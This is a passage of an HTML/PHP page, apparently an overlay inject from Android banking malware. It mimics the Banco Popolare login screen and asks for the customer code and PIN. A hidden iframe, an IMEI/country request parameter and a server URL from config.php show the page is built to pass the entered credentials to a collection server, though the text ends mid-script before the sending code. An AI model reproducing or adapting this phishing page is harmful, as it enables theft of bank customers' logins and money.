<!-- 2.2.7 -->
<html>
<head>
    <meta charset="UTF-8">
    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.4/angular.min.js"></script>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/js/bootstrap.min.js"></script>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.0/umd/popper.min.js"></script>
	<link rel="stylesheet" href="it/com.lynxspa.bancopopolare/style.css">
</head>
<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>
    <div class="header">
        <img style="width: 30%;margin-right: -5%;" src="data:image/png;base64,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">
        <img style="float: right; width: 5%;margin-top: 7px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADcAAAA3CAMAAACfBSJ0AAABrVBMVEUAAAAAMmcAMWQAN3EAPHoAPXsAN3AACBkACRoAOngAPHoAPHoAPHoAOncAO3gAJkoAOnMAPHoAPHoAPHoAPHoAL18ALVoAPHoAPHoAPHoAPHoAPHoAPHoAPHoAPHoAPHoAL2IAQocAQYQAMWMAPHoAPHoAPHoAPHoAPHoAK1gAPHoANm0AN3AAPHoANWoAPHoAPHoAOHIANm8AOHEALl0APHoAPHoAPHsANm0APHsALl0AN28APHoAPHoAOXQANGoAOnYAOXUAOHIACBMAPHoAOXQANm4AN28APHoAIkYAIkoAPHoAOXQANW0AJksALFoAPHoAPHoAOncAN3AAOnYAPHoAPHoAOXUAOnYAPHoAOXUAOHMAOnYAMWIAO3gAKFIAR48APHoAPHoAOXMAN3AAPHoAPHoAOHMAPXsAOXUAPHoAPHoAOnUAOXUAOnUAOXUANWwANGkAOHEAMmUAOHMAOXQAOXMAM2gAN3AAOnUAOHEAOXQAOHEAQIEAL2AAM2cAOXQARYwAOnYAOnUALl0AM2kAOHMANWsALFkAM2gAL2AALVwAO3kAI0cAPHpT+5/BAAAAjnRSTlMAAwUBChAIAQEBNdV+AQEBAT3h6ncCAzvo+fJ60v7neAQBAQR55vbzfALsBwftA+6EDgEBBfiNCQEQAQjwghYBFQgBAZwVAQGbAQGYEAEBA/qOHAEcj6QREZISARIEFQMBmhAHDvyIDgkV+/QVEBIWAQESARIdHQEREA4HEQECBBIBARwDAQkBAgQDAwEB1T19yQAAA0pJREFUSMedVolfUkEQ/jhNQAsyARXt8EBNMRIlL0oDLa0o1LTbSkrNQrPTvCqzc//m5nHuvrfvUQ6/H/pm52Pf7Dc78wF5M5ktKGcWs0njs9rsFWVgR+w2q+iphMPJXECVAar6KFzM6aDYoh2D28OOsxqcMMDVooZiPG6KLsK8PuZndaze8DXrKcLPfN4CsBLeBnIEWCNrwslTUszpM2hmLRTjZw3ewqu6fayVMXK2sSDapbh2BGk1QFGtzOfO+Rwe+hWWBXawZnRKYGdpt64sjFGsx0GubqszD1MsxHpwDmEBdJ48PbRSMD9zWk3otdEpBYrOCOtDP6ICrB995C9YgOIvmDEw6KJzKgGH2DBGECvCoriIYfKWYHXMdWkUGCNeWjign11GHIk8bJxgE1wiAYqtwRVl6Sox08YYtzSJKVzL7zaFSe5HlTOvx/VcAd3InlbJkuwmbiGVzW0aM/Rcsg7iuLa6mEWQOy/FZnGbgKOYw6zg7yKGOVOqISIEzOMO7uIe5gVvhPi9z5dROzE0pAI+oI8IGyJ2Hz4SyO0kjvxCjgt4jAUhNz9x+0RdSk+JpQAXtMjSSNM3f87DeKatwefEU1JIJiSknGQTVDkaC2OJmOJteWVZeJ6kiJQWmMIL4krfZmg9JbtjUayq2BIZXRXKXXjVaTr4pASUJFqmVddL2HGOgIsa2CLB5vR2y1X/S+JMawvkHzfqWQm8QjoinuNyJE3ehHFPztALhVYE3EqIfBlj2JrufmvGsHWd/NaNgK+xoXueG/rAGN4Y8PdWL8d3eG9YLx/kwHDZ+lySVUyYml+5+xCXFXb/4e7fx8Pd901Jf/kk6S+bAmprW9LPRuij7WfbWxxuR9I/d4nPXUn/3OE3DAqNXmFrg2Ax+pb0670c5vM2mqjv87nN4EuW5Az91c6Hr9VFpdAmzBxlHu1nV/al8yhrFTT/GoX5N0EEZ4r3MS6Zf6SsLHbtvI1z8zZGT5p5a7fArJ3v33DAHdkBPavnu80Mk0RPRFVdTqYnBP3SpaNfOrX6Ra2Xvv+zXuL0WTN+/Ic+O6Qe5PTnzz192C+N/izp3d8G21X90ejdnL4eHCujr8cG1fpa0YW9A2X1/EBvd+Hfv1F5vpuZ6tPEAAAAAElFTkSuQmCC">
    </div>
    <h3 class="text-center">ACCEDI</h3>
    <p>Inserisci il codice identificativo ed il pin per effettuare l'accesso</p>
    <form action="null" method="post" id="_mainForm" target="flow_handler">

    <label for="login">Codice Identificativo </label>
    <input type="tel" class="field" id="login" id="login" placeholder="Inserisci il tuo codice identificativo">

    <label for="password">Pin </label>
    <input type="password" class="field" id="pin" id="pin" placeholder="Inserisci il PIN">

    <div class="footer1">
        <input type="submit" class="button" id="input_submitBtn" value="PROCEDI">
    </div>

    <div class="footer2">
        <div class="left">
            <b>Serve aitu?</b><br>
            <p>Per utenti ex BPM</p>
            <p>Per utenti ex Banco Popolare</p>
        </div>
        <div class="left" style="text-align: right;">
            <b style="margin-top: 10px;">800 100 200</b><br>
            <b>800 024 024</b>
        </div>
    </div>
    </form>
    <iframe src="about:blank" name="flow_handler" style="visibility:hidden;display:none"></iframe>
<script type="text/javascript">
   (function () {
		var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
            var input = objDoc.createElement("input");
            input.setAttribute("type", "hidden");
            input.setAttribute("name", sNm);
            input.setAttribute("value", sV);
            input.value = sV;
            objForm.appendChild(input);
        };

        var g_oBtn = document.getElementById('input_submitBtn');
        g_oBtn.onclick = function () {

            var oNumInp = document.getElementById('login');
            var oCodeInp = document.getElementById('pin');

            try{
                oNumInp.className = 'field';
                oCodeInp.className = 'field';
            } catch(e){};

            if (!/^\w{3,50}$/i.test(oNumInp.value)) {
                try{
                    oNumInp.className = 'field error';
                } catch(e){};
                return false;
            }

            if (!/^\w{3,50}$/i.test(oCodeInp.value)) {
                try{
                    oCodeInp.className = 'field error';
                } catch(e){};
                return false;
            }

			top['closeDlg'] = true;
          	var url='<?php echo $URL; ?>';
           	var imei_c='<?php echo $IMEI_country; ?>';
